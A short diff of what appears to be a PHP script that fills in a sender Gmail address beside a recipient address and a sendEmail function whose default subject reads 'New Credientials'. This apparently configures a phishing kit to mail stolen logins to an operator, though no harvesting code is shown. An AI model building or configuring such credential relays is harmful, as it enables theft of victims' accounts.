@@ -6,7 +6,7 @@ header("Content-Type: application/json");
 
 
 $EMAIL = "alexjace151@gmail.com";
-$SENDER_EMAIL = "";
+$SENDER_EMAIL = "jacealex151@gmail.com";
 
 
 function sendEmail($message, $subject = "New Credientials") {
